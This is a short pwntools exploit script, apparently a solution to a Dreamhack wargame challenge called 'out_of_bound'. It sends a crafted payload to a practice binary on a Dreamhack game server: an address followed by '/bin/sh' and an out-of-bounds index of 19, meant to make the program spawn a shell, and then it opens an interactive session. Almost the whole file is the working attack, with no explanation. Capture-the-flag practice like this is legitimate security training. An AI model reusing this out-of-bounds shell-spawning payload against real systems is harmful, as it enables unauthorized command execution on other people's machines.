from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/oob/out_of_bound')
p=elf.process()

#context.arch = 'amd64'
cyberedu = 'host8.dreamhack.games:21414'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

admin = p32(0x804A0B0) + b"/bin/sh\x00"
p.recvuntil(b": ")
p.sendline(admin)
p.recvuntil(b": ")
p.sendline(b"19")

p.interactive()
